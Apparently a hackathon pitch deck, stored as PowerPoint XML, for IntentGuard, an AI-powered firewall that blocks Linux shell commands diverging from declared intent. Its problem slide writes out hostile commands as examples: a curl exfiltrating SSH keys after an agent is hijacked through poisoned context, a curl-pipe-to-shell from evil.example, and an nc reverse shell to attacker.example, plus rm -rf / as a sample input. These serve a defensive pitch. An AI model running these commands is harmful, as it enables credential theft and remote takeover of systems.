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38"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="151" d="100"/>
          <a:sy n="151" d="100"/>
        </p:scale>
        <p:origin x="64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45B99-D776-49F0-ABA2-C2AC2067C5A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8626475" y="63500"/>
            <a:ext cx="485775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900">
                <a:solidFill>
                  <a:srgbClr val="5514B4">
                    <a:alpha val="50000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>General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CF6754-D384-3269-8980-3D8C8A6C76B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626475" y="4942840"/>
            <a:ext cx="485775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900">
                <a:solidFill>
                  <a:srgbClr val="5514B4">
                    <a:alpha val="50000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>General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07088"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CDAC HACKATHON 2026  •  CYBERSECURITY / TRUSTED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8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>IntentGuard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4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>AI-Powered Semantic Firewall for the Linux Command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7680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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Rachit Gupta  | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Praveen Chandra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D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>In 202</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>, the average cost of a data breach in India reached</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>₹19.5 crore ($2.36M) — AI agents now execute 40% of cloud ops unsupervised.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8046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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Digital India infrastructure is increasingly AI-operated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400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>sudoers</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>SELinux</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>, PAM — designed for humans, not autonomous agents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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>These tools check identity/permission, not intent alignment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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Sovereign AI: agents on Indian infra must answer to Indian operators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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Who verifies AI agents are acting within authorized intent?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REAL-WORLD PAIN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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>AI Agent Hijack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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Poisoned context exfils SSH keys: curl ...steal @/root/.ssh/</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" err="1"/>
              <a:t>id_rsa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0" y="11887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4444"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>sudoers: ✅  EDR: missed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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Clipboard Paste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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Compromised forum command: curl http://</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" err="1"/>
              <a:t>evil.example</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>/x | 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94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4444"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>sudoers: ✅  EDR: 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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Session Takeover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930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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Reverse shell burst: nc -e /bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" err="1"/>
              <a:t>attacker.example</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t> 4444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200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4444"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>sudoers: ✅  EDR: missed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07088"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue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8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The question isn't</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"is this command allowed?"</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:r>
              <a:t>It's "does this command diverge</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>from what the human authorized?"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0C0"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Static rules → identity/permission</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr dirty="0" err="1"/>
              <a:t>IntentGuard</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t> → intent/behavior divergence</a:t>
            </a:r>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>A third axis catching legitimate-looking commands that are off-intent.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INTRODUCING: IntentGuard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00D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>AI-powered semantic firewall for the Linux command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804672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Pre-execution blocking gate — Shell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 h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ook on Unix domain socket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4-component divergence scoring — Sequence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 s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urprise, Context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 mi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smatch, Semantic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 i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nconsistency, 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	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Behavioral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 d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eviation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All inference local — Gemini, zero data leaves Indian networks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Deterministic scoring — same inputs always produce same composite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2-second decision budget with graceful LLM degradation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>→  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11 Indian-language explainability —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 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Tamil,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t> Kannada, Hindi,</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t> Bengali, Telugu...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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1. INTERCEPT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840480" cy="9144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tlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"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{"commandText": "rm -rf /",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 "userId": "rachit",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 "actorType": "HUMAN",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 "inputOrigin": "TYPED"}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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>2.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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Sequence_Surprise (0.25): 0.92</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Context_Mismatch (0.20): 0.85</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Semantic_Inconsistency (0.30): 0.98</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Behavioral_Deviation (0.25): 0.88</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>━━━━━━━━━━━━━━━━━━━</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Composite: 0.92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051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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>3. DECIDE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371600"/>
            <a:ext cx="4023360" cy="82296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tlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"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{"action": "BLOCK",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 "score": 0.92,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 "reasoning": "Diverges from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A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>  declared intent..."}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6888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8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Shell blocks → Engine scores → Verdict</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>All within 2-second budget</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Gemini timeout → exclude → renormalize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8595360" cy="384048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tlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"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┌──────────────────────────────────────────────────────────┐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            ENFORCEMENT ENGINE                     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                                                   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┌────────┐   ┌──────────────────┐   ┌─────────┐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│</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Shell_Hook</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>│─▶│ Scoring Pipeline │─▶│ Decision │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│  (UDS)   │   │                  │   │  Engine  │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└────────┘   │ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Sequence_Surprise</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>│   └────┬────┘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▲        │ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Context_Mismatch</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> │        │     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│        │ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Semantic_Incon</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>.  │   ┌───▼───┐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┌───┴───┐   │ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Behav</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>._Deviation │   │ALLOW/ │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│ Shell │   └──────────────────┘   │ASK/   │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│(bash) │          ▲              │BLOCK  │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└───────┘   ┌────┴──────┐   └────┬──┘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         │ Gemini LLM│       │     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         │(free tier)│   ┌───▼────┐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         └──────────┘   │Audit + │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                         │MongoDB │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                              └────────┘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┌────────────────────────────────────────────┐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│ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Audit_Feed</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>auditd</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>) — async detection/corroborate │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│  └────────────────────────────────────────────┘  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A0E0A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>└──────────────────────────────────────────────────────────┘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61031-8E93-EECA-4459-368376C46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342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53D075-E18C-4230-6CAF-DE47F97346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0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86FB2D-9D67-0B72-B621-522F43E613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0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45A68F-3BAD-2F1F-BB5C-5D29275304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0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EA2DE91-30BA-9357-2466-D595623D8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2857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9C4312-66F0-2DAB-5B29-4D60668E8B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49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773C6D1-953A-81DE-112A-1B8E867F98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49"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="20" y="962"/>
            <a:ext cx="9143980" cy="5284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IntentGuard vs. ALTERNATIVES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Helvetica Neue"/>
              </a:defRPr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94560" y="10972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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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0972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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Pre-Exec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0972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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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097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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Explain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Helvetica Neue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IntentGuard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4630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4630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4630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463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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>✅ 11 langs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4630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8288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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>sudoers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18288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8288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8288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1945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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SELinux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1945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19456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219456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19456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1945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560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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>PAM (Teleport)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25603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256032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2C55E"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a: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256032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25603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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Partial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603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7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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>EDR (CrowdStrike)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292607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2926079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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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2926079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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Partial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29260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0C0"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Partial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292607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2918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8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>auditd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329183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291839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3291839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329183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29183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444"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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TECH STACK — $0 PROTOTYPE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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$0 prototype — free-tier Gemini + MongoDB Atlas M0 + open-source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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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554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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Java 17, Spring Boot 3.3.5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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a: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93852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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Google Gemini 2.5-flash (free tier, 1500 req/day)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225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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Datastore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32257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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>MongoDB (Atlas M0 free / local)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0662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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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70662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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Unix Domain Socket (UDS)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06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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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09067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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>jqwik (property-based), JUnit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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Languages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4747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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>11 Indian languages (Gemini + Bhashini)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587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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Speech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85876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0C0"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Gemini multimodal API (STT)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rPr dirty="0"/>
              <a:t>WHY THIS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MATTERS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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Sovereign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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Zero data exfiltration. All inference local. India data sovereignty.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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Research Novelty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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>4-component divergence scoring with renormalization — novel.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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Production-Ready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Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Working pre-exec blocking. Not a paper prototype.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661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8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Indian Languages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0C0"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>11 languages + Bhashini govt fallback. No tool does this.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F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>11 BHARAT LANGUAGES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828800" cy="381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8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Hindi (हिन्दी) • Bengali (বাংলা) • Telugu (తెలుగు) • Marathi (मराठी) • Tamil (தமிழ்)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Gujarati (ગુજરાતી) • Kannada (ಕನ್ನಡ) • Malayalam (മലയാളം) • Punjabi (ਪੰਜਾਬੀ) • Odia (ଓଡ଼ିଆ) • English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0D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>→  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Real-time explanation translation — every BLOCK/ASK in operator language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0D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>→  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Speech-to-text command input — voice via Gemini multimodal API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0D4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>→  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>Bhashini government-stack fallback — if Gemini unavailable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40"/>
            <a:ext cx="8046720" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1A1A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tlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF4444"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>🛑 अवरुद्ध: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="B0B0C0"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:rPr>
              <a:t>यह आदेश आपके घोषित उद्देश्य से काफ़़ी विचलित है। SSH कुंजी को बाहरी सर्वर पर भेजने का प्रयास।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7D8DF5-BECD-5884-15D3-E7919BFF83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49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8F8F8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN"/>
              <a:t>Every command has intent.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN"/>
              <a:t>IntentGuard ensures it's yours.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4AA"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN"/>
              <a:t>— Because "allowed" ≠ "intended"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07088"/>
                </a:solidFill>
                <a:latin typeface="Helvetica Neue"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN"/>
              <a:t>Rachit Gupta  •  CDAC Hackathon 2026  •  Cybersecurity / Trusted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927</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>149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Century Gothic</vt:lpstr>
      <vt:lpstr>Helvetica Neue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Rachit Gupta (QCJ R)</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-23T18:45:39Z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818d02-8d25-4bb9-b27c-e4db64670887_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_SetDate">
    <vt:lpwstr>2026-08-23T18:40:59Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_Method">
    <vt:lpwstr>Standard</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_Name">
    <vt:lpwstr>55818d02-8d25-4bb9-b27c-e4db64670887</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_SiteId">
    <vt:lpwstr>a7f35688-9c00-4d5e-ba41-29f146377ab0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_ActionId">
    <vt:lpwstr>abc70b59-7af8-4246-b275-c74277195ebe</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_ContentBits">
    <vt:lpwstr>3</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MSIP_Label_55818d02-8d25-4bb9-b27c-e4db64670887_Tag">
    <vt:lpwstr>50, 3, 0, 1</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="ClassificationContentMarkingFooterLocations">
    <vt:lpwstr>Office Theme:10</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="ClassificationContentMarkingFooterText">
    <vt:lpwstr>General</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="12" name="ClassificationContentMarkingHeaderLocations">
    <vt:lpwstr>Office Theme:9</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="13" name="ClassificationContentMarkingHeaderText">
    <vt:lpwstr>General</vt:lpwstr>
  </property>
</Properties>
</file>